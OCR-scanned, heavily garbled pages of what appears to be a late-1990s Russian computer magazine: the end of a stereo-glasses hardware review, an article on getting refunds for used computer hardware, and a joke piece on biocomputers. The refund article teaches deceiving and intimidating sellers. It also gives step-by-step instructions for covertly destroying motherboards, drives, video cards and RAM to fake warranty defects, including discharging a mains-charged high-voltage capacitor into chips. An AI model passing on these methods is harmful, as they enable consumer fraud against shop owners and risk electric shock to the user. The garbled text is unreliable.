2. Драйвер выполняет стереосепарацию на основе данных 
об удаленности объектов от наблюдателя (извлекаются из 
2 -буфера) и делит фреймбуфер на два подкадра - для пра- 
вого и левого глаза. Эти два подкадра расположены один 
над другим. К примеру, в разрешении 800x600 подкадр за- 
нимает чуть менее 800x300. Фреймбуфер организуется та- 
ким образом, что в нем хранятся два подкадра, а также 
тестовый паттерн для конвертера. 

3. Конвертер, который подключается к выходу Ѵообоо2- 
платы (или ВапзЬее-платы), преобразует видеосигнал в вид, 
который является стереоскопичным, с помощью стереооч- 
ков. Конвертер попросту вставляет импульс Ѵ-5упс посреди 
полного кадра. Монитор воспринимает дополнительный V- 
5упс как конец удвоение частоты вертикальной развертки и 
растягивает изображение, чтобы оно занимало весь экран. 
Таким образом, в рассмотренном случае монитор отобра- 
жает разрешение 800x300 с частотой 150 Гц. 









суше кружок поменьше находится на расстоянии 10 см, но его 
проекция совпадает с проекцией большого кружка. Поэтому 
для того чтобы определить расстояние до кружка , наблюдате- 
лю необходимы два глаза. 

Однако даже люди с двумя глазами не всегда видят мир в 
объеме. Есть люди , не различающие цвета, а есть люди, у ко- 
торых нет чувства глубины , либо это чувство притуплено. Та- 
ким людям стереоочки не дадут ничего (левша никогда не ку- 
пит мышку, рассчитанную только под правую руку). В реаль- 
ной жизни подобный дефект может совершенно не мешать, 
но поиграть в 30- игры в стерео они не смогут. 

Стереосепарация 



Два глаза человека — это как две видеокамеры, расположен- 
ные в двух разных местах. Видят они разные вещи, а мозг из 
двух картинок собирает одну. 



левый глаз 



правый глаз 




Драйвер позволяет настраивать параметр, называемый 
стереосепарацией, контролирующий разницу между правым и 
левым глазом, образно говоря — «расстояние между глазами». 
Чем меньше стереосепарация, тем более « плоской » кажется 
картинка. При увеличении стереосепарации картинка стано- 
вится глубже, однако, изображение может начать двоиться. 
Этот параметр можно установить в какое-то оптимальное 
значение в настройках, а подстраивать его на лету. 



Вертикальная сепарация 

Интересно, что даже если изображения для правого и лево- 
го глаза разнесены по вертикали (считай это наклоном головы), 
то картинка в мозгу собирается правильно. Вполне может 
быть, что на экране монитора подкадры бу- 
дут разнесены по вертикали, так как конвер- 
тер не может со 100% точностью вставить 
Ѵ-8упс точно посредине кадра. Вертикальная 
сепарация также может меняться на лету. 






связано с тем, что на мо- 
нитор подается удвоен- 
ная частота развертки, 
и, хотя разрешение ста- 
новится вдвое ниже (то 
есть ріхеі сіоск не изме- 
няется), некоторые мони- 
торы не держат высокие 
частоты развертки. К 
примеру, если монитор 
не держит 1 50 Гц (необ- 
ходимое условие при ус- 
тановке 75 Гц на плате), 
то для стереорежимов 



придется понизить частоту развертки. 

В настройках указываются также размер диагонали мони- 
тора (для правильной вертикальной сепарации) и дефолтную 




Помимо универсальных настроек ѴѴіскесІѴізіоп, может пот- 
ребоваться установка нескольких параметров, которые разли- 
чаются для разных игр. Обычно драйвер сам умеет подстраи- 
ваться под игру, а новые версии драйверов включают настрой- 
ки для новых 30-игр. В ис- 
ключительных случаях нас- 
троить игру можно самому. 

2его зіегео зерагаііоп сііз- 
іапсе (дистанция нулевой 
стереосепарации) — бли- 
жайшая точка, которая 
имеет нулевую стереосепа- 
рацию, то есть находящаяся 
в плоскости экрана. Все, что 
дальше этой точки, будет 

«за экраном», все, что ближе - будет «вылезать перед экра- 
ном». Обычно этот параметр настраивается так, чтобы в плос- 
кости экрана лежали индикаторы здоровья, НІЮ и т.п. вещи. 

2Э ОЬ|есіз йеіесііоп (распознавание 20-объектов) — мини- 
мальная глубина, которую имеют 30-объекты. Если глубина 
объекта меньше заданной, он интерпретируется как 20-объект 




4. Кадры для правого и левого глаза выводятся поочередно. Если 
ты смотришь на экран без стереоочков, то увидишь раздвоенное 
изображение, так как мозг человека не может разделить изобра- 
жения, чередующиеся со столь высокой частотой. Для такого раз- 
деления и предназначены очки. Жидкокристаллические створки 
закрывают поочередно правый и левый глаз (в нашем случае 60 
раз в секунду). Очки синхронизированы с монитором с помощью 
инфракрасного передатчика, который подключен к конвертеру. 

5. Правый и левый глаз человека видит на экране монитора раз- 
ные изображения, которые сливаются в одно. При этом человек 
ощущает глубину. 



Горячие клавиши 



На лету можно менять множество параметров с помощью горя- 
чих клавиш: стереосепарация, вертикальная сепарация, включение 

стереорежима, форсирование 
разрешения. В будущих драйве- 
рах обещана также гамма-кор- 
рекция на лету — весьма важная 
функция, доступная пока только 
владельцам плат Сопора. 

Т оддіе Зіеіео Ь ВеюМюо Оѵеігйв 



I Универсальные настройки ѴѴіскесІѴізіоп 



Настройки режимов ѴѴіскесІѴізіоп происходят в отдельном диа- 
логовом окне. Каждому разрешению можно назначить частоту 
развертки, отличную от той, которая прописывается в Ке2Р1ех. Это 



' ' 



— 

г Іе« Зіегео 5ер«аііоп I 
| Мою Зіеіео $ер«аііоп 
^ Іе« ѴвКісаІ 5«р«а(іоп 
• Ммв ѴеіііеаІ $ер«а»іоп 
Т оддіе Зіеіво 
Тоддіе 5ер«а»юп 
- Т еяе і і Ви ііиііі н Р ' Ч і игі і 



и не участвует в стереосепарации. 

■ II и ■'■■■■■■ ' ■■■ !" ' ."..'. ' .и і > ■ ■■■■■ 



Другие возможности драйвера 



Помимо перечисленного, в настройках есть гамма-коррек- 
ция, отключение синхронизации ѵ-зупс, разгон. 

В комплекте идет собственный ОрепОЬвраппер, без ко 
рого не будет работать большая часть функций: Ке2Р1ех, 
ѴѴіскесІѴізіоп и лазерный прицел. ОрепОІ_-драйвер можно нас- 
троить так, чтобы сделать в Оьіаке 2 противников мерцающими 
(чтоб не прятались ;). 




Лазерный прицел относится к категории «фенечек», то есть 
он вроде бы особо не нужен, но с ним приятнее. Суть простая - 
во всех зНооіегах есть прицел-крестик. В стерео этот крестик 
находится в плоскости экрана, а наблюдатель смотрит 
«вглубь». Лазерный прицел — стереоскопичная замена такого 
крестика. Пятно лазерного прицела, форма которого задается 
в драйвере, отображается «там, где надо». Если ты целишься в 
монстра, пятно будет именно на нем. 



Недостатки стерео 



За стерео придется заплатить. Как уже было сказано, фак- 
тическое разрешение в стерео снижается вдвое. Вместо 
800x600 ты получишь 800x300. Хуже того, скорость в стерео- 
режимах сильно снижается из-за работы драйвера примерно 
на 20%. 












Так что для стерео вынь да положь $И. В случае 
Вап$Нее, конечно, можно установить любое разрешение, к примеру, 
800x1200, чтобы иметь фактическое разрешение на мониторе 800x600, 
но ВапзНее явно не имеет необходимой мощности, чтобы дать в таком 
разрешении высокую скорость. 




■ Режим стерео Р Обычный режим 




Ну, а теперь немного о плате Ѵепдеапсе. Плата сделана на основе 
ВапзЬее и имеет все навороты ѴѴіскесІ ЗР Ѵообоо 2. Благодаря Ре2РІех, 
Ѵепдеапсе может работать на разрешениях до 2000x1500. Заметь, на 

скриншоте для 2000x1500 можно 
поставить частоту 62 Гц. Это соот- 
ветствует ріхеі сіоск 263 МГ ц. РАМ- 
РАС у Ѵепдеапсе разогнан до 270 
МГц. Качество РАМРАС достаточно 
хорошее, в 1280x1024 изображение 
вполне приемлемого качества. 

Так как можно установить разреше- 
ние с произвольным азресі гайо пик- 
селов, на картинке в настройках по- 
казывается, как будет выглядеть экран на мониторе с соотношением сто- 
рон 4:3. Прикола ради, можешь полюбоваться, как выглядит разрешение 
800x1200. 












’ЛМх Ѵоосіоо 



„И *а*1*»«| 

* »о, 



Т***- ТѴі аііу ^ 



Общие впечатления 

О стереоскопии нельзя рассказать пол- 
ностью в одной статье . Для этого приш- 
лось бы рассказывать о каждой игре в от- 
дельности , потому что в любой из них есть 
свои особенности. Сложно определить , в ка- 
ких играх эффект глубины лучше ощущает- 
ся . В ()иаке 2 , например , потрясающий 
эффект производят частицы , говоря техни- 
ческим языком , а по-нашему — мухи , кото- 
рые кружатся вокруг трупов , выстрелы из 
гаіі §ип и госкеі Іаипскег, — каждая такая 
частичка находится на своем месте , и если 
без очков они выглядят как кучу точек , то в 
очках из них складывается ощутимый трех- 
мерный объект — мухи приближаются и 
удаляются , а выстрел гаусса образует 
эффектную спираль . Индикатор здоровья и 
тому подобный орнаменту который нахо- 
дится в плоскости экрана, а также рука с 
оружием, тоже подчеркивают эффект глу- 
бины. . 

Интересно также наблюдать, как игры , 
которые выглядели нормально без очков , 
становятся несколько «не от мира сего». 
Хороший пример — Іпсотіп §, в котором 
спецэффекты рисуются в плоскости экрана. 
Только надев очки, ты увидишь, что самоле- 
тики летают в трехмерном пространстве, 
а след от ракеты, пущенной вслед, находит- 
ся в плоскости экрана. Такие артефакты 
можно наблюдать и в других играх Напри- 
мер, в Ѵпгеаі туман и круги вокруг фонарей - 
они не могут быть стереоскопичными, 
поэтому их надо отключать. В отличие от 
«не-совсем-3 (1-объектов» Іпсотіп§-а, кото- 
рые даже и не бросаются в глаза, туман и 
круги в Ѵпгеаі просто не вписываются в об- 
щую картину, более того — режут глаза. Но 
игр в полном 30 большое количество. С боль- 
шей частью новых игр совершенно разных 
жанров не должно быть никаких проблем. 
Какая-то непостижимая магия делает еди- 
ницы игр такими, которые дают умопотря- 
сающий эффект. Такой игрой является, нап- 
ример, ЕхрепйаЫе — лично на меня сте- 
реоэффект в этой игре произвел наибольшее 
впечатление . 

Но не надо чрезмерно переоценивать сте- 
реоскопию. Все-таки 300 строк на экране - 
недостаточно , и, вообще, нельзя однозначно 
сказать, что лучше — стереоскопия или 
вдвое большее разрешение. Скорее всего, если 
ты купишь очки, то будешь играть и с ни- 
ми, и без них. Стереоскопичное изображе- 
ние, получаемое с помощью еуеБСВЕАМ, - 
все-таки иллюзия. Н даже при сверхвысоком 
разрешении и высокой частоте кадров иллю- 
зия останется иллюзией и не сможет срав- 
ниться с реальной жизнью, которую ты ви- 
дишь аппаратом, несравнимо более слож- 
ным, чем любые очки, - человеческим глазом. 
Но, при всем при этом, все равно ІѴіскесІ ЗИ 
остается лучшей платой на Ѵоойоо 2, 
Ѵепдеапсе - лучшей платой на Ваткее, а 
еуеБСКЕАМ точно будет самым лучшим 
ир^гайе в новом году. 

Благодарим компанию МеіаЬуіе за помощь 
в тестировании . 

Смотрите также 2-ую страницу обложки. 




РС 20МЕ 




Прогресс — дело хорошее и временами 
даже нужное. Еще вчера мы играли в иг- 
ры, где треугольник гонялся за квадратом, 
а герои РРС состояли, в лучшем случае, 
из 1 00 точек. Еще 2 года на- 
зад казалось, что двух гига- 
байтный диск и забить-то не- 
чем, а сегодня.... 

Но у этого же прогресса и у 
этой же пресловутой науч- 
но-технической революции 
есть и неприятная сторона. 

Дело идет к тому, что желе- 
зо устаревает быстрее, чем 
нам хотелось бы. Иной раз 
купишь себе железяку, пока 
то да се, распакуешь, подключишь, еще и 
побаловаться ею как следует не успел, а 
она уже полное барахло, можно старьев- 
щику сдавать. 

Выкладывать каждый год по штуке грина 
на апгрейд как-то в лом. А с другой сторо- 
ны, хочется и машину помощнее, видео- 
карту побыстрГее, да и мониторчик поквад- 
ратней, чтоб все было «как у людей». 
Казалось бы, хочешь хорошую машину — 
плати деньги. Устарела машина — поку- 
пай новую. Но это не наш путь. Это у них 
там, за бугром, деньгами швыряют налево 
и направо, а нам бы как-нибудь так, чтоб 
у нас все было, а нам за это ничего не бы- 
ло. Политики нас уверяют, что мы живем в 
правовом государстве. Очень хорошо! 
Ведь в правовом государстве — покупа- 
тель всегда прав, особенно, если он хоро- 
шо выучил Закон о защите прав потреби- 
теля. Этим-то законом мы и воспользуем- 
ся. И научим тебя, приятель, как сдавать 
ненужное железо обратно в магазин, по- 
лучая при этом свои денежки обратно. 

Все очень просто. Наша цель — купить 
компьютер, периферию или комплектую- 
щие, какое-то время попользоваться ими, 
а потом обменять на более современное 
оборудование или вернуть устаревшее 
барахло назад в магазин и получить свои 
деньги обратно. 

«Автостоп» 
для хакера 

Выгода очевидна. Пример: купив год на- 
зад Мопзіег на Ѵообоо 2, ты потратил 
$150. Сдав через год этот же Мопзіег на- 



зад в магазин, ты получишь свои $150, но 
на них сможешь уже купить Мопз1ег2 на 
чипсете Ѵообоо2 и т.д. Во всем мире, как, 
впрочем, и в России, имеется целый класс 
юзеров, которые 
вообще не платят за 
модернизацию своих 
компьютеров. Они 
правдами и неправда- 
ми сдают устаревшее 
железо обратно в ма- 
газин и получают свои 
кровные назад. Для 
многих это стало свое- 
го рода хобби, что-то 
вроде автостопа. Нуж- 
но как можно дольше продержаться, не 
тратя на апгрейт ни копейки, и собрать 
как можно более крутую машину. 

Способ №І. 

Система Мопеу Васк 
в действии! 

Дело в том, что в большинстве западных 
магазинов действует система Мопеу Васк. 
То есть можно купить товар и на законных 
основаниях вернуть его в течение опреде- 
ленного времени (как правило, срок 2 неде- 
ли), если он тебе по какой-либо причине не 
подошел. Причем причины могут быть са- 
мые разные и самые простые: не понравил- 
ся цвет, собирает много пыли, громко шу- 
мит, вообще не шумит или тебя , например, 
раздражает горящая лампочка Роѵ/ег :). Не- 
которые российские магазины, подражая 
неразумным западным коллегам, то ли по 
наивности, а скорее по глупости, тоже вве- 
ли подобную систему. Если ты нашел такой 
магазин, беги скорее туда. Например, тебе 
требуется сканер. Ну, зачем же выкидывать 
свои деньги, если сканер тебе нужен всего- 
то на 5 дней (отсканить фотки, снятые скры- 
той камерой около твоей кровати :)). Займи 
у друга денег (при отсутствии друга можно 
получить нужную сумму, сдав в ломбард ма- 
мины золотые украшения, папину машину, 
откопать бабушку и выдрать у нее золотые 
зубы). Потом покупаешь сканер, делаешь 
свою работу и возвращаешь сканер обрат- 
но в магазин. При возврате ты, с лицом вос- 
питанника института благородных девиц, 
объяснишь, что сканер не подходит к твое- 
му компьютеру. 



Но такие магазины — большая редкость, да 
и не всегда в них есть то, что тебе нужно. Но, 
на самом деле, подобную операцию можно 
легко провернуть практически в любом мага- 
зине. На это существует способ №2 

Способ №2. 

Прикинься лохом! 

Дело в том, что система Мопеу Васк была 
долгое время обязательной для продав- 
цов и в России. Согласно Закону о защи- 
те прав потребителя ты мог вернуть лю- 
бой товар в течение 2 недель обратно, 
если он по каким-либо причинам тебя не 
устроил. Но 19 января 1998 года наше 
мудрое правительство приняло Поста- 
новление №55, в котором причислило 
компьютеры, комплектующие и перифе- 
рию к товарам, которые не подлежат об- 
мену или возврату в случае, если они над- 
лежащего качества. (См. врезку) 

УТВЕРЖДЕН 
Постановлением 
Правительства 
Российской Федерации 
N 55 от 1 9 января 1 998 года 
ПЕРЕЧЕНЬ 

товаров длительного пользования, на ко- 
торые не распространяется требование 
покупателя о безвозмездном предостав- 
лении ему на период ремонта или заме- 
ны аналогичного товара 

1 . Автомобили, мотоциклы и другие виды 
мототехники, прицепы и номерные агре- 
гаты к ним, кроме товаров, предназна- 
ченных для использования инвалидами, 
прогулочные суда и плавсредства. 

2. Мебель. 

1 1 . Технически сложные товары бытово- 
го назначения, на которые установлены 
гарантийные сроки (станки металлорежу- 
щие и деревообрабатывающие бытовые; 
кухонное оборудование; электробыто- 
вые машины и приборы; бытовая ра- 
диоэлектронная аппаратура; бытовая 
вычислительная и множительная техника; 
фото- и киноаппаратура; телефонные 
аппараты и факсимильная аппаратура; 
электромузыкальные инструменты; иг- 
рушки электронные). 



Наша цель — купить ком- 
пьютер, периферию или 
комплектующие, какое-то 
время попользоваться 
ими, а потом обменять на 
более современное обо- 
рудование или вернуть 
устаревшее барахло на- 
зад в магазин и получить 
свои деньги обратно. 



Статья 1 8. Последствия продажи товара 
ненадлежащего качества 
1 . Потребитель, которому продан товар 
ненадлежащего качества, если оно не 
было оговорено продавцом, вправе по 
своему выбору потребовать: 

* безвозмездного устранения недостат- 
ков товара или возмещения расходов на 
их исправление потребителем или 
третьим лицом; 

- соразмерного уменьшения покупной 
цены; 

- замены на товар аналогичной марки 
(модели, артикула); 

- замены на такой же товар другой марки 
(модели, артикула) с соответствующим 
перерасчетом покупной цены; 

- расторжения договора купли-продажи. 
При этом потребитель обязан возвратить 
товар с недостатками. При этом потреби- 
тель вправе потребовать также полного 

змещения убытков, причиненных ему 
ьследствие продажи товара ненадлежа- 
щего качества. Убытки возмещаются в 
сроки, установленные настоящим Зако- 
ном, для удовлетворения соответствую- 
щих требований потребителя. 

В отношении технически сложных това- 
ров требования потребителя, указанные 
в абзацах четвертом — шестом настоя- 
щего пункта, подлежат удовлетворению в 
случае обнаружения в товарах сущес- 
твенных недостатков. Перечень таких то- 
варов утверждается Правительством 
Российской Федерации. 

Конечно, об этом Постановлении знают 
все продавцы и, услышав твою просьбу о 
возврате работающего товара, с удо- 
вольствием процитируют этот откровен- 
свинский документ. Но соблюдение 
нескольких простых правил позволит те- 
бе все-таки добиться своего вопреки су- 
ществующему закону. В основе этих пра- 
вил — тактика изматывания и устраше- 
ния продавца. 

Правило №1. Выбор магазина 

Мы советуем делать покупки в мелких и 
средних фирмах. Там мало бюрократии, 
формализма и волокиты, поэтому любые 
вопросы можно быстро решить на месте. 
Да и до директора фирмы, если что, доб- 
раться не трудно. К тому же мелкие и сред- 
ние фирмы, как правило, торгуют с много- 
численными нарушениями. Часто у них от- 
сутствуют сертификаты соответствия и ин- 
струкции на русском языке (по закону эти 
документы они обязаны предоставить поку- 



пателю). Как правило, они не проверяют то- 
вар при продаже (хотя обязаны это делать), 
говоря, что они и не припомнят, когда у них 
были бракованные изделия. Скорее всего, у 
них есть проблемы с арендой помещения, с 
кассовым аппаратом, бух. учетом и уплатой 
налогов. Резона афишировать свою дея- 
тельность у них нет. Поэтому все возникаю- 
щие проблемы они предпочитают решать 
на месте, не доводя дело до огласки и прив- 
лечения правоохранительных органов. 

Всем этим-то мы и воспользуемся. 

Правило №2. Процедура покупки 

Желательно придти в магазин с другом 
(возможно, он выступит в роли свидете- 
ля в дальнейшем). При покупке при- 
кинься полным лохом. Задай продавцу 
20-30 глупых вопросов. Твоя задача: 
показать, что ты очень придирчиво и 
щепетильно относишься к покупке. В 
конце разговора продавец должен счи- 
тать тебя очень противным и придирчи- 
вым покупателем и при этом глупым и 
неграмотным. К тому же он должен на- 
долго запомнить твой визит. Выбрав, 
наконец-то, то, что тебе нужно (напри- 
мер, тот же сканер), несколько раз 
спроси, подойдет ли он к твоему ком- 
пьютеру. Объясни, что до этого ты по- 
купал 2 сканера, и они не подошли. 
Продавец, устав от твоей тупости, ска- 
жет, что, конечно же, он подойдет. На 
просьбу проверить сканер он ответит, 
скорее всего, отказом (проверять ска- 
нер в магазине будет только сумасшед- 
ший). Вот это-то тебе и нужно. Поинте- 
ресуйся, можно ли вернуть сканер, ес- 
ли он не подойдет. Продавец, скорее 
всего, согласится, понимая, что сканер 
не может не подойти, и надеясь, что у 
тебя все будет в порядке. 

Все! Наше грязное дело сделано. 

Правило №3. Оформление документов 

При покупке не забудь оформить все 
необходимые документы: кассовый чек и 
гарантийный талон. Без них тебе не удас- 
тся предъявить никакие претензии. Поин- 
тересуйся, есть ли инструкция на русском 
и сертификат соответствия. Если их нет, 
то это тоже тебе на руку. 

Правило №3. Возврат товара 

Через несколько дней (не следует тя- 
нуть более 7~10 дней ) ты можешь сме- 
ло топать в магазин и возвращать то- 
вар. Придя в магазин, желательно по- 
пасть на того же продавца. Грустно 



улыбнувшись, скажи, что тебе опять не 
повезло, сканер не подошел, и ты хотел 
бы оформить возврат. Пожалуйся, что, 
скорее всего, дело в твоем компьюте- 
ре, который плохо сконфигурирован. 
Напомни, что ты предупреждал о воз- 
можных проблемах и что продавец обе- 
щал оформить возврат, в случае чего. 
Скорее всего, продавец согласится, с 
ужасом вспомнив тебя и не желая выс- 



Как у блатъ железо 



Ну и, наконец-то, несколько советов о 
том, как незаметно испортить некоторые 
компьютерные комплектующие. 

Довольно много способов убить мате- 
ринскую плату. Самый простой из них — 
отключить питание при перепрошивке 
РІазГі ВЮ5. Результат гарантирован. 
Универсальный способ — подать повы- 
шенное напряжение на разъемы микрос- 
хем (метод годится для любых плат). 

1 . Для этого берешь конденсатор и два 
провода. Конденсатор обязательно не 
электролитический, напряжение 400-500 
вольт, емкостью 0,25-1 мкФ (можно при- 
менить конденсатор от ламп дневного 
света). 

2. Заряжаешь конденсатор от сети (на- 
поминаем, конденсатор не электроли- 
тический). 

3. Присоединяешь провода к паре любых 
площадок на контроллере. 

4. Прикасаешься проводами к конден- 
сатору. 

5. Повторить пару раз. :) 

Если прикасаться к контактам микросхе- 
мы проводами, уже подсоединенными к 
конденсатору, то на плате могут остаться 
следы разряда. 

Жесткий диск требует иного подхода. За- 
пусти приложение, активно обращаю- 
щееся к винту, затем поверни винт на 45 
градусов и не сильно постучи. Головки 
должны поцарапать поверхность. При 
необходимости повторить процедуру. 
Можно также взять источник тока от 6 до 



лушивать твое нытье. Если продавец 
заупрямится и начнет отпираться от 
своих слов о возврате, скажи, что у те- 
бя есть свидетель. Припомни отказ про- 
верить технику, отсутствие инструкции и 
сертификата (если они отсутствовали). 
Объясни, что ты твердо знаешь свои 
права и будешь добиваться своего до 
упора. Попроси, чтобы вызвали дирек- 



014 




РС 2ШЕ 



тора. Спокойным, уверенным голосом 
объясни ему, что в случае отказа ты об- 
ратишься в Суд, Мосторгинспекцию, 
Антимонопольный комитет, Налоговую 
инспекцию и Общество по защите 
прав потребителя. И они рассудят ваш 
спор. Намекни, что у тебя уже есть 
опыт подобных дел. Любой уважающий 
себя человек не станет с тобой прере- 
каться и выполнит все условия, лишь бы 



1 2 вольт и подключить к разъему 5 В на 
диске. Постепенно увеличивай напряже- 
ние по 1-1.5 V, ждешь 1 минуту. Если 
диск живой, продолжай увеличивать нап- 
ряжение. Неплохой способ — потрясти 
работающий диск. 

Видеоплаты с ТѴ выходом легко умирают 
при втыкании и вытыкании провода, сое- 
диняющего ТѴ с картой. Естественно, при 
включенном компе. Нужно быстро повто- 
рять процедуру раз 1 0 подряд. 
Универсальный способ — использовать 
статическое электричество. Потри плату 
о шерстяной свитер. Иногда тереть при- 
ходится очень долго. :) Однако этот метод 
отлично работает на ОЗУ. 

Звуковые платы самые живучие. Попро- 
буй метод со статикой и с конденсато- 
ром. 

Мониторы портить не рекомендую. В 
каждом мониторе практически всегда ес- 
ть дефекты изображения: несведение, 
плохая геометрия. Тебе останется дока- 
зать, что данный монитор не удовлетво- 
ряет твоим требованиям и не решает 
поставленных задач (скажи, что ты рабо- 
таешь с полиграфией, в журнале по за- 
щите прав потребителей «Спрос» :)). 

Ну и хватит на сегодня, пожалуй. А то сей- 
час весь компьютер испоганишь. Но в бли- 
жайших номерах мы продолжим публика- 
цию методов «убийства» разного железа. 
Мы будем очень рады, если ты пришлешь 
нам свои способы. 



больше не видеть и не слышать тебя, а, 
тем более, эти доблестные организа- 
ции. Дело сделано, забирай свои день- 
ги. Кстати, если в случае отказа ты ре- 
шишь обратиться в суд, то дело ты, ско- 
рее всего, выиграешь, в виду многочис- 
ленных нарушений закона со стороны 
продавцов. К тому же суд практически 
всегда на стороне покупателя в спор- 



ных случаях, так как судьи сами покупа- 
тели и торгуют лишь иногда собствен- 
ной совестью. 

Способ №2 имеет один большой недос- 
таток. Срок возврата товара ограничен 
7-10 днями. Иначе продавцы справедли- 
во спросят, почему же ты не пришел рань- 
ше, и заподозрят подвох. В большинстве 
случаев нас это не устроит. На это у нас 
заготовлен способ №3. 

Способ. №3. 

Сохрани свой капи- 
тал, делая откровен- 
ные гадости 

Итак, ты не хочешь менять любимые же- 
лезки каждые две недели. ОК. Ты смо- 
жешь поменять или вернуть их в течение 
всего гарантийного срока. Выше рас- 
сматривались лишь те случаи, когда то- 
вар сдается в рабочем состоянии. Их вер- 
нуть и обменять труднее всего. С брако- 
ванными и неисправными товарами все 
намного проще. Их ты можешь обменять 
или вернуть в течение всего гарантийного 
срока на основании Закона о правах 
потребителя, ст. №18 (смотри врезку). 
Осталась самая малость — сделать твой 
продукт нерабочим. Точнее говоря, сло- 
мать его так, чтобы продавец не понял, 
что это сделали ты. 

Как видно из Закона, здесь есть огром- 
ные просторы для деятельности: мы мо- 
жем отремонтировать товар, обменять 
товар на аналогичный, поменять на но- 
вый. Все в наших руках. Труднее всего 
добиться возврата денег. В Законе ука- 
зано, что расторжение договора купли- 
продажи возможно только при наличии 
существенных недостатков. Что такое 
существенные недостатки, тоже указано 
в Законе (см. врезку). Как видишь, опре- 
деление довольно расплывчатое. Под 
него подпадает практически любое не- 
соответствие продукта поставленным 
задачам. Например, покупая сканер, ты 
рассчитывал на определенное качество 
получаемой картинки. Поработав на 
нем, ты понял, что на самом деле сканер 
выдает вовсе не то качество, на кото- 
рое ты рассчитывал. А это как раз под- 
падает под определение «Существен- 
ный недостаток». 

Таким образом, ты легко сможешь вер- 
нуть неработающий товар назад. Прав- 
да, ты опять-таки должен будешь следо- 
вать всем правилам, указанным в спосо- 
бе №2. Если продавец предложит отре- 



монтировать или обменять товар на ана- 
логичный, не соглашайся ни в коем слу- 
чае! Скажи, что после поломки ты не до- 
веряешь этому продукту, а о покупке ' 
другого ты еще подумаешь и опреде- 
лишься позже. Поэтому будет лучше, ес- 
ли тебе вернут деньги. Помни, твоя сила 
в том, насколько серьезно и убедительно 
будут звучать твои аргументы и насколь- 
ко серьезными покажутся твои претензии 
и угрозы. Учти, что доводить дело до су- 
да — не лучшее решение (сложная про- 
цедура, отнимает много времени и сил. 
Но это не значит, что не нужно угрожать 
судом :)). В любом случае, попытайся ре- 
шить все на месте. 

Маленькое напоминание: так как все 
расчеты на территории России произво- 
дятся в рублях, то и деньги свои ты полу- 
чишь в деревянных. Есть шанс пролететь 
при высокой инфляции. Пример. Год нс 
зад ты отхватил видеокарту за 600 руб- 
лей ($100), сегодня ты решишь ее вер- 
нуть. Ты получишь на руки те же 600 
рублей, но по сегодняшнему курсу это 
всего-навсего $26. Так что остается 
только надеяться на скорейшую финан- 
совую стабилизацию. Если вам захоте- 
лось воспользоваться нашими советами, 
обязательно загляните на сайт 
ѵѵ\ѵ\ѵ.5рго$.т. Там лежит куча информа- 
ции о защите прав потребителя, все за- 
коны и нормативные акты, образцы 
заявлений и адреса компетентных орга- 
нов. есть специальная страничка, посвя- 
щенная обмену и возврату компьюте- 
ров. Удачи! 



Игорь Л омо во ѵ 



Существенный недостаток товара (рабо- 
ты, услуги) — недостаток, который делает 
невозможным или недопустимым исполь- 
зование товара (работы, услуги) в соот- 
ветствии с его целевым назначением, ли- 
бо который не может быть устранен, ли- 
бо который проявляется вновь после ус- 
транения, либо для устранения которого 
требуются большие затраты, либо вслед- 
ствие которого потребитель в значитель- 
ной степени лишается того, на что он 
был вправе рассчитывать при заключѳ- 



к, 



кругом только и слышно: 
«Американские ученые открыли то- 
то, синтезировали это, вживили микрос- 
хему тому-то, глаза на лоб вылезли у то- 
го-то...» Но толком никто ничего сказать 
не может, только делают умное лицо и 
произносят загадочную фразу: «Ну, ты же 
понимаешь, эта информация сразу туда 
ушла», и показывают пальцем кверху. Ну 
да, так я и поверил! Очень нужна альпи- 
нистам эта информация! И так везде, 
представляете? Каждый тычет паль- 
цем вверх и 



тает- 



ся меня убе- 
дить, что те, кто там, наверху, все засек- 
ретили. Короче, в один прекрасный день 
мне все это надоело, и я решил сам во 
всем разобраться. Поехал в ассоциацию 
альпинистов России и прямо спросил: 
«Почему вы всю информацию о компью- 
терных биотехнологиях засекречиваете?» 
Меня почему-то спустили с лестницы и 
сказали, что в следующий раз вызовут 
мне скорую. И тут я догадался. Ну, конеч- 
но же, скорая! «Био» и «медицина» ведь 
так близко! Странно, но в скорой мне то- 
же ничего не рассказали, а зачем-то пог- 
рузили меня на носилки и отвезли в пси- 
хиатрическую лечебницу. Оказалось 
очень кстати. Именно там я и познако- 
мился с некоторыми людьми (они тоже 
м отдыхали), которые мне столько по- 
^ассказывали! 

Что вы знаете о биокомпьютерах? 
Пока маловато, но скоро ими детей пу- 
гать будут. С тех пор, как открыли, что че- 
ловек думает мозгом, всем понятно, что 
его надо изучать. Изучали его очень ак- 
тивно: и из тела вынимали, и электродами 
туда тыкали.... Но с развитием компью- 
терных технологий стало возможным 
взглянуть на проблему с другой стороны... 



Для начала научись правильно вскрывать 
чѳрѳпі 



Вот сидели американские ученые и 
думали, что те гении, которые со мной в 
палате не лежат, дохнут как селедка в лу- 
же с нефтью. А ведь было бы здорово 
сделать так, чтобы их драгоценный мозг 
не умирал вмести с телом. Но какие-то 
Уроды, типа нашего зав. 
Отделением, — такие ис- 



следования запретили. Ведь в мертвом 
человеке мозг портится очень быстро. 
Чтобы продлить его существование, 
необходимо «подключиться» к нему за- 
долго до естественной смерти человека. 
Я с крысами и лягушками часто такое 
проделывал. Просто вскрываешь крыске 
череп и подсоединяешь туда 
электроды в нужных 
местах. 



а работает на оборонку и крупный биз- 
нес — у них деньги есть. Это действитель- 
но сложная штуковина. Мы вот тут с 
Наполеоном пытались ее 
сами спаять — не 
полу- 





Все 

это обрабаты- 
вается на компьютере, 
машина искусственно поддержи- 
вает жизнь своей жертвы. Обрати внима- 
ние: чтобы «подключиться», мозг выни- 
мать не нужно. Аккуратно распили крыш- 
ку черепа и быстро подсоединяйся 



чилось. 
Хотя, может, нам 
просто мозгов не хватило? Не 
наших, в смысле, а тех, которые мы в 
операционной свистнули. У них там после 
операций много зап. частей остается. 



Побалуйся с имплантантами 
(мои любимые опыты). 



электродами. 



Тут и медики подоспели. Совершен- 
ство технологий позволяет сейчас доста- 
точно органично интегрировать в живое 
тело электрические модули. Так вот, в 
Южной Калифорнии Теодор Бергер ак- 
тивно сращивает кремневые 
чипы и живую 




Используй нейросети! 



Но неутомимые ученые не сдавались. 
Стали делать нейросети. Дело в том, что 
обыкновенный компьютер сделан до бо- 
ли неправильно. Оптимальной считается 
троичная система счисления, а у компью- 
теров она — двоичная. Знаете про АВМы 
(Аналоговые Вычислительны Машины)? 
Серая тумбочка с блестящими клеймами 
решает дифференциальные уравнения 
так лихо, что любой Пентиум выпадет в 
осадок от зависти. Там все математичес- 
кие функции моделируются реальными 
физическими (аналоговыми) процессами. 
